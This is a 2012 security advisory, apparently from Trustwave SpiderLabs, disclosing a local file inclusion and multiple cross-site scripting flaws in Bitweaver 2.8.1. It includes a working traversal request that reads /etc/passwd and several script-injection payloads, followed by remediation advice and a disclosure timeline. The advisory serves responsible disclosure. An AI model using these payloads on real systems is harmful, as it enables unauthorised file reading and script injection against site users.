@@ -1,0 +1,253 @@
+Trustwave SpiderLabs Security Advisory TWSL2012-016:
+Multiple Vulnerabilities in Bitweaver
+
+Published: 10/23/2012
+Version: 1.0
+
+Vendor: Bitweaver (http://www.bitweaver.org/)
+Product: Bitweaver
+Version affected: 2.8.1 and earlier versions
+
+Product description:
+Bitweaver is a free and open source web application framework and content
+management system. Bitweaver is written in PHP and uses Firebird as a
+database backend.
+
+Credit: David Aaron and Jonathan Claudius of Trustwave SpiderLabs
+
+Finding 1: Local File Inclusion Vulnerability
+CVE: CVE-2012-5192
+
+The 'overlay_type' parameter in the 'gmap/view_overlay.php' page in
+Bitweaver is vulnerable to a local file inclusion vulnerability.
+
+This vulnerability can be demonstrated by traversing to a known readable
+path on the web server file system.
+
+Example:
+
+Performing LFI on 'overlay_type' parameter
+
+#Request
+
+http://A.B.C.D/bitweaver/gmap/view_overlay.php?overlay_type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd%00
+
+#Response
+
+root:x:0:0:root:/root:/bin/bash
+<snip>
+
+Finding 2: Multiple XSS Vulnerabilities in Bitweaver
+CVE: CVE-2012-5193 
+
+Multiple cross-site scripting (XSS) vulnerabilities have been discovered
+that allow remote unauthenticated users to run arbitrary scripts on the
+system.
+
+Example:
+
+The following Proof of Concepts illustrate that Bitweaver 2.8.1 is
+vulnerable to XSS.
+
+Example(s):
+
+1. Performing XSS on stats/index.php
+
+#Request
+
+GET /bitweaver/stats/index.php/%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E HTTP/1.0
+
+#Response
+
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:42:34 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=4gmfnd86ahtvn34v5oejgivvh3; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+[truncated due to length]
+
+2. Performing XSS on /newsletters/edition.php
+
+#Request
+
+GET /bitweaver/newsletters/edition.php/%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E HTTP/1.0
+
+#Response
+
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:42:02 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=ajdjp797r7atral75rmlhcgs63; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+[truncated due to length]
+
+3. Performing XSS on the 'username' parameter available on /users/
+
+#Request
+
+POST /bitweaver/users/remind_password.php HTTP/1.1
+Host: A.B.C.D
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+username=%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E&remind=Reset+%28password%29
+
+#Response
+
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:53:11 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=i0ktqmt3497thag552t9ds78v4; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html; charset=utf-8
+Content-Length: 15974
+[truncated due to length]
+
+<snip>
+Invalid or unknown username: ">alert('XSS');</p></div>Please follow the instructions in the email.
+<snip>
+
+4. Performing XSS on the 'days' parameter on /stats/index.php
+
+#Request
+
+POST /bitweaver/stats/index.php HTTP/1.1
+Host: A.B.C.D
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 177
+
+days=%22%3E%3Cscript%3Ealert('XSS')%3B%3C%2Fscript%3E&pv_chart=Display
+
+#Response
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:55:53 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=dqdvcnmql8jhngp0tphseh1qh4; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Type: text/html; charset=utf-8
+Content-Length: 24778
+[truncated due to length]
+
+<snip>
+<img src="/stats/pv_chart.php?days="><script>alert('XSS');</script>" alt="Site Usage Statistics" />
+<snip>
+
+5. Performing XSS on the 'login' parameter on /users/register.php. (try
+entering "><IFRAME src="https://www.trustwave.com" height="1000px"
+width="1000px"> into the "Username field"):
+
+http://A.B.C.D/bitweaver/users/register.php
+
+
+6. Performing XSS on the 'highlight' parameter:
+
+#Request
+
+GET /bitweaver/?highlight=%2522%253E%253Cscript%253Ealert('XSS')%253B%253C%252Fscript%253E HTTP/1.0
+
+#Response
+
+HTTP/1.1 200 OK
+Date: Tue, 17 Apr 2012 15:59:09 GMT
+Server: Apache/2.2.20 (Ubuntu)
+X-Powered-By: PHP/5.3.6-13ubuntu3.6
+Set-Cookie: BWSESSION=ama93jqlojmi385plkft5opl64; path=/bitweaver/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=utf-8
+[truncated due to length]
+
+Remediation Steps:
+The vendor has released a fix to address the Local File Inclusion
+vulnerability (finding 1) and several of the Cross-Site Scripting
+vulnerabilities (finding 2) in Bitweaver 3.1. However, additional fixes for
+the Cross-site Scripting vulnerabilities were made on commit c3bef6f in the
+development branch.  Users are recommended to download the latest release
+of Bitweaver on http://github.com/bitweaver to address the above issues.
+
+These issue can also be mitigated with the use of technologies, such as Web
+Application Firewalls (WAF) or Intrusion Prevention Systems (IPS). Often,
+Vulnerability Scanners and Intrusion Detection Systems (IDS) can detect the
+presence of Local File Inclusion vulnerabilities and XSS. Trustwave
+technologies that address this issue include the following.
+
+ModSecurity (http://www.modsecurity.org/) has added rules to the commercial
+rules feed for these issues, available as part of the SpiderLabs
+ModSecurity rules feed.
+
+Trustwave's vulnerability scanning solution, TrustKeeper
+(https://www.trustwave.com/trustKeeper.php), has been updated to detect
+affected versions.
+
+References
+http://www.bitweaver.org/
+http://blog.spiderlabs.com/
+
+Vendor Communication Timeline:
+04/26/12 - Initial communications with vendor
+05/14/12 - Vulnerability disclosed to vendor
+05/30/12 - Vendor acknowledges version 3.0 fixes issues
+06/07/12 - Contact vendor regarding incomplete fixes in 3.0
+09/07/12 - Vendor publishes version 3.1
+10/10/12 - Contact vendor regarding incomplete fixes in 3.1
+10/23/12 - Advisory published
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
